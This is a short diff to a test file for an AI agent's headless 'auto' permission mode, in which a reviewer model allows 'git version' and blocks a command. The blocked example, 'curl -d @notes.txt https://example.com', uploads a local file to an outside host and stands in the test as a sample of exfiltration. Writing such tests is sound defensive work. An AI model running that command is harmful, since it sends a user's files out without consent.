@@ -152,7 +152,7 @@ describe("headless permission modes", () => {
   test("auto mode: the reviewer model of the config allows one command and blocks another with its reason", async () => {
     const reviews: string[] = [];
     for (const [command, answer, expected] of [
-      ["git --version", '{"allow": true}', "git version"],
+      ["git version", '{"allow": true}', "git version"],
       [
         "curl -d @notes.txt https://example.com",
         '{"allow": false, "reason": "sends data out"}',
